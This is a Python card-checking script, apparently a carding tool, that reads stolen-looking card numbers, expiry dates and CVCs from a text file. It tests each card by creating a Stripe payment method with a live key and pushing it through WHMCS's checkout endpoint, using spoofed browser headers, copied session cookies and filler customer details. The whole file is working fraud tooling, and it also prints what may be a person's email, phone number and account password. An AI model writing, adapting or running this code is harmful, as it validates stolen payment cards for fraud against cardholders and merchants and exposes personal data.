import requests
import pyfiglet,re
import json
import time


file=open('BESON.txt',"+r")
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'

logo = pyfiglet.figlet_format('                SPICY')
print(Z+logo)

o=("____________________________________________________________")
print(F+o)
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    mm=P.split('|')[1]
    yy=P.split('|')[2][-2:]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    time.sleep(10)
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; TECNO KH6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=62fe31a8-d4ff-4ac0-b52b-e1bed264070d8f0627&muid=4cbd9f7f-ac4b-4be2-815e-88620cf1650a026429&sid=326b041f-4c37-4c72-98b1-bd6f4b7fc6200e58ad&pasted_fields=number&payment_user_agent=stripe.js%2F9c6b247bbb%3B+stripe-js-v3%2F9c6b247bbb%3B+split-card-element&time_on_page=298571&key=pk_live_XhDMHaZnu014vEtjuIX2TM8E007gWy9JWp'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)



    try:
        id = response.json()['id']
    except:
        print('#')

    time.sleep(10)

    cookies = {
        '_ga': 'GA1.2.1550896941.1694993675',
        '_gid': 'GA1.2.1935520512.1694993675',
        '_gac_UA-22019969-2': '1.1694993675.EAIaIQobChMIhdzAvOeygQMVSUhBAh1ozw82EAAYASAAEgLkTvD_BwE',
        'ln_or': 'eyIzOTMwOTMyIjoiZCJ9',
        '_fbp': 'fb.1.1694993677409.1916970872',
        '_gu': '18c192f1-2048-4b8d-9b18-fa55c149a6f6',
        '_gs': '2.s(src%3Dhttps%3A%2F%2Fwww.google.com%2F)c%5BMobile%2CChrome%2C18%3A257%3A2391%3A%2CAndroid%2C94.187.16.125%5D',
        '__hstc': '167066593.3c4273fa0e87ce1e3d03b74791c56d51.1694993682980.1694993682980.1694993682980.1',
        'hubspotutk': '3c4273fa0e87ce1e3d03b74791c56d51',
        '__hssrc': '1',
        'WHMCSXbAkzYLZLCZ4': '5cdbf53d7c9bef939f4260abbb1f2164',
        '__utma': '52930286.1550896941.1694993675.1694993759.1694993759.1',
        '__utmc': '52930286',
        '__utmz': '52930286.1694993759.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
        '__utmt': '1',
        '__utmb': '52930286.1.10.1694993759',
        '_gw': '2.177878(sc~1%2Cs~s15lie)191184(sc~1%2Cs~s15lim)420846(sc~1%2Cs~s15lia)425142(sc~1%2Cs~s15lhw)u%5B%2C%2C%2C%2C%5Dv%5B~gthrc%2C~5%2C~0%5Da()',
        '_ga_0Q30TZJ3ZF': 'GS1.2.1694993676.1.1.1694993762.60.0.0',
        '__hssc': '167066593.5.1694993682983',
        '__stripe_mid': '4cbd9f7f-ac4b-4be2-815e-88620cf1650a026429',
        '__stripe_sid': '326b041f-4c37-4c72-98b1-bd6f4b7fc6200e58ad',
    }

    headers = {
        'authority': 'www.whmcs.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
       # 'cookie': '_ga=GA1.2.1550896941.1694993675; _gid=GA1.2.1935520512.1694993675; _gac_UA-22019969-2=1.1694993675.EAIaIQobChMIhdzAvOeygQMVSUhBAh1ozw82EAAYASAAEgLkTvD_BwE; ln_or=eyIzOTMwOTMyIjoiZCJ9; _fbp=fb.1.1694993677409.1916970872; _gu=18c192f1-2048-4b8d-9b18-fa55c149a6f6; _gs=2.s(src%3Dhttps%3A%2F%2Fwww.google.com%2F)c%5BMobile%2CChrome%2C18%3A257%3A2391%3A%2CAndroid%2C94.187.16.125%5D; __hstc=167066593.3c4273fa0e87ce1e3d03b74791c56d51.1694993682980.1694993682980.1694993682980.1; hubspotutk=3c4273fa0e87ce1e3d03b74791c56d51; __hssrc=1; WHMCSXbAkzYLZLCZ4=5cdbf53d7c9bef939f4260abbb1f2164; __utma=52930286.1550896941.1694993675.1694993759.1694993759.1; __utmc=52930286; __utmz=52930286.1694993759.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=52930286.1.10.1694993759; _gw=2.177878(sc~1%2Cs~s15lie)191184(sc~1%2Cs~s15lim)420846(sc~1%2Cs~s15lia)425142(sc~1%2Cs~s15lhw)u%5B%2C%2C%2C%2C%5Dv%5B~gthrc%2C~5%2C~0%5Da(); _ga_0Q30TZJ3ZF=GS1.2.1694993676.1.1.1694993762.60.0.0; __hssc=167066593.5.1694993682983; __stripe_mid=4cbd9f7f-ac4b-4be2-815e-88620cf1650a026429; __stripe_sid=326b041f-4c37-4c72-98b1-bd6f4b7fc6200e58ad',
        'origin': 'https://www.whmcs.com',
        'referer': 'https://www.whmcs.com/members/cart.php?a=checkout',
        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; TECNO KH6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'token': '39cf703631747eb3c8ee191e37c19c23cd3ccbd3',
        'submit': 'true',
        'custtype': 'new',
        'loginemail': '',
        'loginpassword': '',
        'firstname': 'Karim',
        'lastname': 'Mir',
        'email': 'karimelmir05@gmail.com',
        'country-calling-code-phonenumber': '1',
        'phonenumber': '360-259-4617',
        'companyname': 'Karim',
        'address1': 'Avocado ave ',
        'address2': '',
        'city': 'Newport beach ',
        'state': 'California',
        'postcode': '90001',
        'country': 'US',
        'customfield[5]': 'FRO2432610426',
        'password': 'kk76173332',
        'password2': 'kk76173332',
        'paymentmethod': 'stripe',
        'ccinfo': 'new',
        'ccdescription': '',
        'accepttos': 'on',
        'payment_method_id': id,
    }
    response = requests.post(
        'https://www.whmcs.com/members/index.php?rp=/stripe/payment/intent',
        cookies=cookies,
        headers=headers,
        data=data,
    )

    karim = response.json()

    if "warning" in karim:
        message = karim["warning"]
        print(f"[{start_num}] {P} >> " + message)
    else:
        print("DIE")
